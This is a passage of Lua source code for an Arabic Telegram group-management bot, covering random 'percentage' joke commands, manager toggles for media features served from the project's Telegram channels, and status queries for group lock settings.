Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ᥀" and DevRio:get(SAKO..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevRio:del(SAKO..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(SAKO..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ᥀" and DevRio:get(SAKO..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الكره ', 1, 'md')
DevRio:del(SAKO..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(SAKO..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ᥀" and DevRio:get(SAKO..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevRio:del(SAKO..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(SAKO..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ᥀" and DevRio:get(SAKO..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevRio:del(SAKO..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(SAKO..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ᥀" and DevRio:get(SAKO..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevRio:del(SAKO..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Age:Rio'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Age:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(SAKO..'Rio:Age:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Mean:Rio'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل معاني الاسماء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Mean:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(SAKO..'Rio:Mean:Rio'..msg.chat_id_) then
...
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:gif:Rio'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and SourceCh(msg) or text == "تعطيل المتحركه" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:gif:Rio'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ᥀") and not DevRio:get(SAKO..'Rio:gif:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifSAKO/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source SAKO     --
if text == "تفعيل ميمز" and Manager(msg) and SourceCh(msg) or text == "تفعيل الميمز" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:memz:Rio'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and SourceCh(msg) or text == "تعطيل الميمز" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:memz:Rio'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ᥀") and not DevRio:get(SAKO..'Rio:memz:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzSAKO/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source SAKO     --
if text == "تفعيل غنيلي" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Audios:Rio'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Audios:Rio'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ᥀") and not DevRio:get(SAKO..'Rio:Audios:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosSAKO/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source SAKO     --
if text == "تفعيل الاغاني" and Manager(msg) and SourceCh(msg) or text == "تفعيل اغنيه" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:mp3:Rio'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and SourceCh(msg) or text == "تعطيل اغنيه" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:mp3:Rio'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني") and not DevRio:get(SAKO..'Rio:mp3:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/SAKOMp3/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source SAKO     --
if text == "تفعيل ريمكس" and Manager(msg) and SourceCh(msg) or text == "تفعيل الريمكس" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Remix:Rio'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and SourceCh(msg) or text == "تعطيل الريمكس" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Remix:Rio'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ᥀") and not DevRio:get(SAKO..'Rio:Remix:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixSAKO/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source SAKO     --
if text == "تفعيل صوره" and Manager(msg) and SourceCh(msg) or text == "تفعيل الصوره" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Photo:Rio'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and SourceCh(msg) or text == "تعطيل الصوره" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Photo:Rio'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ᥀") and not DevRio:get(SAKO..'Rio:Photo:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosSAKO/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source SAKO     --
if text == "تفعيل انمي" and Manager(msg) and SourceCh(msg) or text == "تفعيل الانمي" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Anime:Rio'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and SourceCh(msg) or text == "تعطيل الانمي" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Anime:Rio'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ᥀") and not DevRio:get(SAKO..'Rio:Anime:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeSAKO/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source SAKO     --
if text == "تفعيل فلم" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Movies:Rio'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Movies:Rio'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ᥀") and not DevRio:get(SAKO..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesSAKO/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source SAKO     --
if text == "تفعيل مسلسل" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Series:Rio'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and SourceCh(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Series:Rio'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ᥀") and not DevRio:get(SAKO..'Rio:Series:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesSAKO/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source SAKO     --
if Admin(msg) then
if DevRio:get(SAKO..'Rio:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevRio:get(SAKO..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الروابط ↫ "..mute_links.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevRio:get(SAKO..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙المعرف ↫ "..lock_tag.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevRio:get(SAKO..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙المتحركه ↫ "..mute_gifs.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الملصقات" then if DevRio:get(SAKO..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الملصقات ↫ "..lock_sticker.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الصور" then if DevRio:get(SAKO..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الصور ↫ "..mute_photo.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevRio:get(SAKO..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الفيديو ↫ "..mute_video.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الاونلاين" then if DevRio:get(SAKO..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local SAKOTeam = "\n" .."᥀︙الاونلاين ↫ "..mute_in.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الدردشه" then if DevRio:get(SAKO..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الدردشه ↫ "..mute_text.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevRio:get(SAKO..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local SAKOTeam = "\n" .."᥀︙التوجيه ↫ "..lock_forward.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الاغاني" then if DevRio:get(SAKO..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الاغاني ↫ "..mute_music.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevRio:get(SAKO..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local SAKOTeam = "\n" .."᥀︙الصوت ↫ "..mute_voice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevRio:get(SAKO..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الجهات ↫ "..lock_contact.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الماركداون" then if DevRio:get(SAKO..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local SAKOTeam = "\n" .."᥀︙الماركداون ↫ "..markdown.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الهاشتاك" then if DevRio:get(SAKO..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local SAKOTeam = "\n" .."᥀︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "التعديل" then if DevRio:get(SAKO..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local SAKOTeam = "\n" .."᥀︙التعديل ↫ "..mute_edit.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "التثبيت" then if DevRio:get(SAKO..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local SAKOTeam = "\n" .."᥀︙التثبيت ↫ "..lock_pin.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الاشعارات" then if DevRio:get(SAKO..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الكلايش" then if DevRio:get(SAKO..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الكلايش ↫ "..lock_spam.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الدخول" then if DevRio:get(SAKO..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local SAKOTeam = "\n" .."᥀︙الدخول ↫ "..lock_Join.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الشبكات" then if DevRio:get(SAKO..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الشبكات ↫ "..lock_wp.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "المواقع" then if DevRio:get(SAKO..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙المواقع ↫ "..lock_location.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "العربيه" then if DevRio:get(SAKO..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙العربيه ↫ "..lock_arabic.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الانكليزيه" then if DevRio:get(SAKO..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local SAKOTeam = "\n" .."᥀︙الانكليزيه ↫ "..lock_english.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الكفر" then if DevRio:get(SAKO..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local SAKOTeam = "\n" .."᥀︙الكفر ↫ "..lock_kaf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الفشار" then if DevRio:get(SAKO..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local SAKOTeam = "\n" .."᥀︙الفشار ↫ "..lock_fshar.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
if text == "الطائفيه" then if DevRio:get(SAKO..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local SAKOTeam = "\n" .."᥀︙الطائفيه ↫ "..lock_taf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam, 1, 'md') end
end
--     Source SAKO     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:LockSettings'..msg.chat_id_) 
end
--     Source SAKO     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:Robot'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:Robot'..msg.chat_id_,true)
end
--     Source SAKO     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:GpRed'..msg.chat_id_,true)
end
--     Source SAKO     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:AllRed'..msg.chat_id_,true)
end
--     Source SAKO     --
if RioSudo(msg) then
...
--     Source SAKO     --
if msg.content_.photo_ then
if DevRio:get(SAKO..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
DevRio:del(SAKO..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevRio:del(SAKO..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(SAKO..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source SAKO     --
...
if data.ID == "Ok" then
